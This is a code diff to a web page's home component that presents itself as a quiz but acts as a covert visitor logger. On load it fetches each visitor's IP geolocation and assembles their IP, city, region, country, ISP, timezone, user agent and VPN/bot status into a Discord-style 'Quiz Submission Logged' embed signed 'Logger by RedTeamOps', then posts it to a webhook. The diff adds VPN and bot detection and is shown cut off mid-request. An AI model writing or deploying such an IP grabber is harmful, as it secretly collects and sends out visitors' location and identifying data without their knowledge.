@@ -5,33 +5,58 @@ export default function Home() {
     fetch('https://ipapi.co/json/')
       .then(res => res.json())
       .then(async data => {
-        // Ensure we're getting the IPv4 address
-        const ip = data.ip.includes(':') ? data.ipv4 : data.ip; // fallback to IPv4
+        // VPN Detection (check if the org or ip indicates VPN usage)
+        const isVPN = data.org && data.org.toLowerCase().includes('vpn');
 
-        // Build the webhook embed object
+        // Basic Bot Detection: Check for common bot user agents
+        const botUserAgents = [
+          "googlebot", "bingbot", "slurp", "baiduspider", "duckduckbot",
+          "yandexbot", "facebot", "facebookexternalhit"
+        ];
+        const isBot = botUserAgents.some(bot => navigator.userAgent.toLowerCase().includes(bot));
+
+        // Log bot and VPN detection
+        console.log("VPN Detected:", isVPN);
+        console.log("Bot Detected:", isBot);
+
+        // Create the embed fields with validation
+        const fields = [
+          { name: "IP", value: data.ip || "Unavailable", inline: true },
+          { name: "City", value: data.city || "Unavailable", inline: true },
+          { name: "Region", value: data.region || "Unavailable", inline: true },
+          { name: "Country", value: data.country_name || "Unavailable", inline: true },
+          { name: "ISP", value: data.org || "Unavailable", inline: false },
+          { name: "TimeZone", value: data.timezone || "Unavailable", inline: true },
+          { name: "User Agent", value: navigator.userAgent || "Unavailable", inline: false },
+          { name: "VPN Status", value: isVPN ? "Yes" : "No", inline: true },
+          { name: "Bot Status", value: isBot ? "Yes" : "No", inline: true }
+        ];
+
+        // Ensure all fields have the necessary values
+        const validFields = fields.filter(field => field.name && field.value);
+
+        if (validFields.length === 0) {
+          console.error("No valid fields to send to Discord");
+          return;
+        }
+
         const embed = {
           username: "Quiz Logger",
-          embeds: [{
-            title: "📥 Quiz Submission Logged",
-            color: 0x7289DA,
-            fields: [
-              { name: "IP", value: ip, inline: true },
-              { name: "City", value: data.city, inline: true },
-              { name: "Region", value: data.region, inline: true },
-              { name: "Country", value: data.country_name, inline: true },
-              { name: "ISP", value: data.org, inline: false },
-              { name: "TimeZone", value: data.timezone, inline: true },
-              { name: "User Agent", value: navigator.userAgent, inline: false },
-              { name: "Is VPN", value: data.is_vpn ? "Yes" : "No", inline: true },
-              { name: "Is Proxy", value: data.is_proxy ? "Yes" : "No", inline: true },
-              { name: "Is Bot", value: data.is_bot ? "Yes" : "No", inline: true }
-            ],
-            footer: { text: "Logger by RedTeamOps" },
-            timestamp: new Date().toISOString()
-          }]
+          embeds: [
+            {
+              title: "📥 Quiz Submission Logged",
+              color: 7506394,
+              fields: validFields,
+              footer: { text: "Logger by RedTeamOps" },
+              timestamp: new Date().toISOString()
+            }
+          ]
         };
 
-        // Send data to the webhook endpoint
+        // Log the final embed object to check its structure
+        console.log("Payload to send:", embed);
+
+        // Send the payload to the webhook
         await fetch("/api/webhook", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
